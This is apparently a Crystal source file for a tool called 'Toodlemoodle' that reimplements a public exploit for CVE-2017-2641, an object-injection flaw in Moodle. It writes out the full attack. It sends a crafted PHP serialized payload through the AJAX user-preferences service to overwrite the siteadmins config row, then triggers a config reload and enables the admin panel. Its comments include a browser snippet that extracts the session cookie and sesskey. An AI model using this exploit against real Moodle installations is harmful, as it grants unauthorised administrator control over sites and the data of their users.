# TODO: Write documentation for `Toodlemoodle`
require "http/client"
require "option_parser"
require "json"
require "base64"
require "digest"

module TMoodleActions
  class SqlInjection
    # CVE : CVE-2017-2641
    # This exploit is a Crystal implementation by Claudio Spiess of the original
    # PHP version by Marko Belzetski. Many thanks.
    # From https://www.exploit-db.com/exploits/41828

    # Get your sesskey, moodle session, and user id first:
    # Login to moodle and type this in the address bar (Chrome will not let you paste): javascript:
    # Then paste this:
    # alert("MoodleSession: " + document.cookie.match(new RegExp('(^| )MoodleSession=([^;]+)'))[2] + "\nSessKey: " + M.cfg.sesskey + "\nUser id: " + document.querySelectorAll('[data-userid]')[0].getAttribute("data-userid"))
    # Or paste it into the Dev Tools console.
    def perform(url)
      puts "[?] Enter your MoodleSession. Use helper command if needed."
      moodle_session = "4cee42a0c279474d278c5d708c3f1498" # gets().not_nil!
      # puts "[?] Enter session key"
      sess_key = "CS9edmUxOp" # gets().not_nil!
      puts "[?] Enter your user id"
      user_id = 3 # gets().not_nil!.to_i
      puts "[>] Executing attack..."
      execute(url, moodle_session, sess_key, value: user_id)
      puts "[*] You should now be an administrator."
    end

    def execute(url, moodle_session, sess_key, table = "config", row_id = 25, column = "value", value = 3)
      # table = "config" # table to update
      # row_id = 25      # row id to insert into. 25 is the row that sets the "siteadmins" parameter. could vary from installation to installation
      # column = "value" # column name to update, which holds the userid
      # value = 3        # userid to set as "siteadmins" Probably want to make it your own

      puts "[>] Setting configuration payload..."
      update_table(url, moodle_session, sess_key, table, row_id, column, value)

      row_id = 375 # row id of "allversionshash" parameter
      # reset the allversionshash config entry with a sha1 hash so the site reloads its configuration
      sha_hash = Digest::SHA1.hexdigest(Time.utc_now.to_unix.to_s)
      puts "[>] Resetting config hash to trigger configuration reload..."
      update_table(url, moodle_session, sess_key, table, row_id, column, sha_hash)

      # reset the sortorder so we can see the front page again without the payload triggering
      data = {"sesskey" => sess_key, "sortorder[]" => "1"}
      puts "[*] Resetting sort order to prevent retriggering payload..."
      puts http_post(url + "/blocks/course_overview/save.php", data, moodle_session, false).body

      # force plugincheck so we can access admin panel
      puts "[*] Activating admin panel..."
      puts http_get(url + "/admin/index.php?cache=0&confirmplugincheck=1", moodle_session).body
    end

    private def http_post(url, data : String, moodle_session, json)
      headers = HTTP::Headers.new
      headers.add("Cookie", "MoodleSession=" + moodle_session)
      if json
        headers.add("Content-Type", "application/json")
      end

      if json
        return HTTP::Client.post(url, headers: headers, body: data)
      else
        puts "Big oops!"
        puts data.to_s
        return HTTP::Client.post(url, headers: headers, body: data)
      end
    end

    private def http_post(url, data : Hash(String, String), moodle_session, json)
      headers = HTTP::Headers.new
      headers.add("Cookie", "MoodleSession=" + moodle_session)
      if json
        headers.add("Content-Type", "application/json")
      end

      if json
        puts "Big oops"
        puts data.to_s
        return HTTP::Client.post(url, headers: headers, body: HTTP::Params.encode(data))
      else
        return HTTP::Client.post(url, headers: headers, form: data)
      end
    end

    private def http_get(url, moodle_session)
      headers = HTTP::Headers.new
      headers.add("Cookie", "MoodleSession=" + moodle_session)
      return HTTP::Client.get(url, headers: headers)
    end

    private def update_table(url, moodle_session, sess_key, table, row_id, column, value)
      # first we create a gradereport_overview_external object because it is
      # supported by the Moodle autoloader and it includes the grade_grade and
      # grade_item classes that we are going to need
      # below is a serialized PHP object
      table_name_length = table.bytesize
      column_name_length = column.bytesize
      # value = "a:2:{i:0;a:1:{" \
      #         "i:0;O:29:\"gradereport_overview_external\":0:{}}" \
      #         "i:1;O:40:\"gradereport_singleview\\local\\u\\feedback\":1:{" \
      #         "s:5:\"grade\";O:11:\"grade_grade\":1:{" \
      #         "s:10:\"grade_item\";O:10:\"grade_item\":6:{" \
      #         "s:11:\"calculation\";" \
      #         "s:12:\"[[somestring\";s:22:\"calculation_normalized\";b:0;" \
      #         "s:5:\"table\";s:#{table_name_length}:\"#{table}\";" \
      #         "s:2:\"id\";i:#{row_id};s:#{column_name_length}:\"#{column}\";" \
      #         "i:#{value};s:8:\"d_fields\";a:2:{" \
      #         "i:0;s:#{column_name_length}:\"#{column}\";i:1;s:2:\"id\";}}}}};"
      puts "Insert payload " + row_id.to_s
      value = gets()
      # puts value
      #   we"ll set the course_blocks sortorder to 0 so we default to legacy user preference
      data = {"sesskey" => sess_key, "sortorder[]" => "0"}
      puts data
      puts "[>] Setting course_blocks sortorder..."
      puts http_post(url + "/blocks/course_overview/save.php", data, moodle_session, false).body

      #    injecting the payload

      # behold the most beautiful json builder. can be parsed by regex (end)*
      string = JSON.build do |json|
        json.array do
          json.object do
            json.field "index", 0
            json.field "methodname", "core_user_update_user_preferences"
            json.field "args" do
              json.object do
                json.field "preferences" do
                  json.array do
                    json.object do
                      json.field "type", "course_overview_course_order"
                      json.field "value", value
                    end
                  end
                end
              end
            end
          end
        end
      end
      # [>] Authenticated session ID => 4cee42a0c279474d278c5d708c3f1498
      # [>] Authenticated session key => CS9edmUxOp
      #     httpPost($url..$sesskey, $data, $MoodleSession,1);
      puts "[>] Injecting payload..."
      puts http_post("#{url}/lib/ajax/service.php?sesskey=#{sess_key}", string.to_s, moodle_session, true).body

      #     getting the frontpage so the payload will activate
      puts "[>] Activating payload"
      puts http_get(url + "/my/", moodle_session).body
    end
  end
end
